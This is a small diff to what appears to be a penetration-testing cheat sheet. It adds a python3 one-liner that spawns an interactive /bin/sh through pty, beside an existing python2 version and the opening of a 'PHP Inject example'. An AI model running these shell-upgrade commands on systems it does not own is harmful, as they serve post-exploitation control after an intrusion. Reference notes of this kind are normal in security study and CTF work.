@@ -2,6 +2,7 @@
 
 #Spawn a tty as well:
 python -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty;pty.spawn("/bin/sh")'
 
 #PHP Inject example
 <?php
